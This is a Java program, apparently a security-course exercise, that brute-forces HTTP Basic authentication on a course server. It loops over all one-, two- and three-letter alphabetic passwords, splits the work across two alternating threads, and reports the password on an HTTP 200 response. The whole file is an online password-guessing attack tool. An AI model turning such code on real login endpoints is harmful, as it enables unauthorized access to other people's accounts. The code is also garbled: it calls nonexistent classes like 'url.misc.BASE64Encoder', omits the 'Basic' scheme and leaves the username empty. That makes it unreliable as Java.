

import java.net.*;
import java.io.IOException;
import java.util.*;
import java.io.*;
public class BruteForce   {
  
  
  
  String passwordLetters[] ={"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
  String password="  ";
  static int counter;
  static int noOfAttempts;
  static String userName="";
  HttpURLConnection u;
  boolean threadF,threadM;
  String passBase64;
  
  PasswordCrackThreadF passwordCrackThreadF;
  PasswordCrackThreadM passwordCrackThreadM;
  URL   url;
  
  
  public BruteForce() {
    breakPassword();
  }

  public static void main (String args[])  {
    new BruteForce();
  }
  
  
  
  private void  breakPassword() {
    int j;
    
    breakOneLetterPassword();
    
    breakTwoLetterPassword();
    
    
    

    passwordCrackThreadF = new PasswordCrackThreadF(0,26,counter++,passwordLetters,userName,this);
    
    passwordCrackThreadM  = new PasswordCrackThreadM(26,52,counter++,passwordLetters,userName,this);
    
    passwordCrackThreadF.print();
    passwordCrackThreadM.print();
  }
  
  
  private void breakOneLetterPassword() {       
     MyHttpURLConnection    httpURLConnection;
     try {
	   
	    url  = new URL( "http://sec-crack.cs.rmit.edu./SEC/2/index.php");
	   
	   passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
           u = (HttpURLConnection)url.openConnection();
	   u.setRequestProperty("Authorization", " " + passBase64);
     } catch  (IOException  io) {io.printStackTrace();}
         
         loop: for (int i=0;i<52;i++) {
                   password = passwordLetters[i];
		   
		   password =":"+ password;
                   try {
                   
	  	       u=  (HttpURLConnection)url.openConnection();
		       passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
                       u.setRequestProperty("Authorization", " " + passBase64);
		       u.connect();	
		       noOfAttempts++;  
		       if (u.getContentLength() != 0) {
		             
		             if (u.getResponseCode()==   HttpURLConnection.HTTP_OK  ) {
		         
	                         System.out.println ("Your User Name : Password is  "+password);
				 System.out.println("   ");
			         System.out.println(" of Attempts / Requests "+ noOfAttempts);
			  
			         System.exit(0);
                     
	                     }
		       }
		   } catch  (ProtocolException  px) {px.printStackTrace();
                   
                   } catch ( NoRouteToHostException nr) {nr.printStackTrace();
	           } catch (BindException e){e.printStackTrace();
	           } catch (IndexOutOfBoundsException  e3){e3.printStackTrace();
	           } catch  (IOException  io) {io.printStackTrace();
		   
	           } finally {u.disconnect();
	           }
        }   
  }
  
  
  private void breakTwoLetterPassword() {   
      MyHttpURLConnection    httpURLConnection;       
      try {
	   
	    url  = new URL( "http://sec-crack.cs.rmit.edu./SEC/2/index.php");
	   
	    passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
            u = (HttpURLConnection)url.openConnection();
	    u.setRequestProperty("Authorization", " " + passBase64);
      } catch  (IOException  io) {io.printStackTrace();}

      
      loop: for (int i=0;i<52;i++) {
                for (int j=0;j<52;j++) {
                   password = passwordLetters[i]+passwordLetters[j];
		    
		   password =":"+ password;
		   
		   
	          
                   try {
		        u=  (HttpURLConnection)url.openConnection();
			 passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
                                  u.setRequestProperty("Authorization", " " + passBase64);
			u.connect();
			noOfAttempts++;
			
            	        if (u.getContentLength() != 0) {
		           if (u.getResponseCode()==   HttpURLConnection.HTTP_OK  ) {
	                      System.out.println ("Your User Name : Password is  "+password); 
			      System.out.println("   ");
			      System.out.println(" of Attempts / Requests "+ noOfAttempts);
			  
			      System.exit(0);
	                   }
		        }
		   
		
	           } catch  (ProtocolException  px) {px.printStackTrace();
                   } catch ( NoRouteToHostException nr) {nr.printStackTrace();
	           } catch (BindException e){e.printStackTrace();
	           } catch (IndexOutOfBoundsException  e3){e3.printStackTrace();
	           } catch  (IOException  io) {io.printStackTrace();
		   
	           } finally {u.disconnect();
	           }
               }  
      }


  }
}

class PasswordCrackThreadF extends  Thread  {
   
   
   
   private String passwordLetters[] ;
   private String password="  ";
   private static String userName="";
   private MyHttpURLConnection    httpURLConnection;
   private URL   url;
   
   BruteForce bruteForce;
   int count;    
   String passBase64;
   private HttpURLConnection  u;
   
   int start,stop;
   
   static boolean found;
   
   PasswordCrackThreadF(int start,int stop,int counter,String[]
                                                 passwordLetters,String userName,BruteForce bruteForce) {
       this.start = start;
       this.stop  = stop;
       this.passwordLetters =passwordLetters;
       this.userName=userName;
       count =counter;
       this.bruteForce=bruteForce; 
       bruteForce.threadF=true;
	
       
       passBase64 = new bruteForce.misc.BASE64Encoder().encode(password.getBytes());
       try {
	     
	     url  = new URL( "http://sec-crack.cs.rmit.edu./SEC/2/index.php");
	    

	     u = (HttpURLConnection)url.openConnection();
             
	     u.setRequestProperty("Authorization", " " + passBase64);
	  

       } catch  (IOException  io) {io.printStackTrace();}

   }
  
   public synchronized void run()  {
     
     outer : for (int i=0; i<stop;i++)  {
                 for (int j=0;j<52;j++) {
                     for (int k=0;k<52;k++) {
                         password = passwordLetters[i]+passwordLetters[j]+passwordLetters[k];
   	                 password =":"+ password;
			 
			
			
			  while (!(bruteForce.threadF)) {
			     try { wait(1); }
			       catch (InterruptedException e){}
			   }  
			   
			  if (found)
			      System.exit(0);
                          try {   
			        u = (HttpURLConnection)url.openConnection();
			        passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
                                u.setRequestProperty("Authorization", " " + passBase64);
			         

			
                                u.connect();
				
		                BruteForce.noOfAttempts++;

		                if (u.getContentLength() != 0) {

		                   if (u.getResponseCode() ==   HttpURLConnection.HTTP_OK  ) {
				       found=true;
				 
				 
					
					  
					
		                        System.out.println ("Your User Name : Password is  "+password+ 
		                                 "   "+ " Found by Thread  "+count);
					System.out.println("   ");
			                System.out.println(" of Attempts / Requests "+ BruteForce.noOfAttempts);
				      	 
               		               System.exit(0);

	                            }
		               }
		   
		 		 
	                 } catch  (ProtocolException  px) {px.printStackTrace();
                         } catch ( NoRouteToHostException nr){k--; 
			    nr.printStackTrace();
                         } catch (BindException e){e.printStackTrace();
	                 } catch (IndexOutOfBoundsException  e3){e3.printStackTrace();
	                 } catch  (IOException  io) {io.printStackTrace();
			 
	                 } finally {u.disconnect();
	                 }
			 bruteForce.threadF=false;
			 bruteForce.threadM=true;
			
			 notifyAll();
			
                    }
		   
     }
    System.out.println("End");
  }
 }
}


class PasswordCrackThreadM extends  Thread  {
   
   
   
   private String passwordLetters[] ;
   private String password="  ";
   private static String userName="";
   private MyHttpURLConnection    httpURLConnection;
   private URL   url;
   String passBase64;
   private URLAuthenticator  urlAuthenticator =  new URLAuthenticator(userName);
   BruteForce bruteForce;
   int count;    
   private HttpURLConnection  u;
   
   int start,stop;
   
   static boolean found;
   
   
   
   PasswordCrackThreadM(int start,int stop,int counter,String[]
                                                 passwordLetters,String userName,BruteForce bruteForce) {
       this.start = start;
       this.stop  = stop;
       this.passwordLetters =passwordLetters;
       this.userName=userName;
       count =counter;
        this.bruteForce=bruteForce; 
       try {
	     
	     url  = new URL( "http://sec-crack.cs.rmit.edu./SEC/2/index.php");
	     
             u = (HttpURLConnection)url.openConnection();
	     passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
               
	     u.setRequestProperty("Authorization", " " + passBase64);

	     

	     
	     

       } catch  (IOException  io) {io.printStackTrace();}

   }
  
   public synchronized void run()  {
     
     outer : for (int i=0; i<stop;i++)  {
                 for (int j=0;j<52;j++) {
                     for (int k=0;k<52;k++) {
                         password = passwordLetters[i]+passwordLetters[j]+passwordLetters[k];
   	                 password=":"+password;
			
	                 
			
			
			  while  (!(bruteForce.threadM)) {
			     try { wait(1); }
			       catch (InterruptedException e){}
			   }
			     
			   
			  if (found)
			      System.exit(0);
                          try {   u = (HttpURLConnection)url.openConnection();
			 
                                  passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
                                  u.setRequestProperty("Authorization", " " + passBase64);
			         

			
                                  u.connect();
                                  BruteForce.noOfAttempts++;
		               
		                 if (u.getContentLength() != 0) {
			           
		                   if (u.getResponseCode() ==   HttpURLConnection.HTTP_OK  ) {
				       found=true;
				      
				   
					
					  
					
		                        System.out.println ("Your User Name : Password is  "+password+ 
		                                 "   "+ " Found by Thread  "+count);
				      	 
					 
					System.out.println("   ");
			                System.out.println(" of Attempts / Requests "+ BruteForce.noOfAttempts);
               		                System.exit(0);

	                            }
		                }
		   
		 		 
	                 } catch  (ProtocolException  px) {px.printStackTrace();
                         } catch ( NoRouteToHostException nr){k--; 
			       nr.printStackTrace();
                         } catch (BindException e){e.printStackTrace();
	                 } catch (IndexOutOfBoundsException  e3){e3.printStackTrace();
	                 } catch  (IOException  io) {io.printStackTrace();
			 
	                 } finally {u.disconnect();
	                 }
			 bruteForce.threadF=true;

			 
			 bruteForce.threadM=false;
			
			 notifyAll();
			
                    }
		   
     }
    System.out.println("End");
  }
 }
}







class URLAuthenticator  extends Authenticator {
   private String uName;
   String passwd;
   static  char[] password;
   public URLAuthenticator(String uName) {

     this.uName = uName;
   }

   public void setPassword(String passwd)  {

	 this.passwd=passwd;
	 password=passwd.toCharArray();

   }
   
   public PasswordAuthentication getPasswordAuthentication()  {

	
 	
	
	return new PasswordAuthentication(uName,password);
   }

}




 

class MyHttpURLConnection extends HttpURLConnection  {
    public MyHttpURLConnection(URL url) {
       super(url);
    }
    public void disconnect() {
    }

    public boolean usingProxy() {
        return true;
    }
    public void connect() {
    }

}

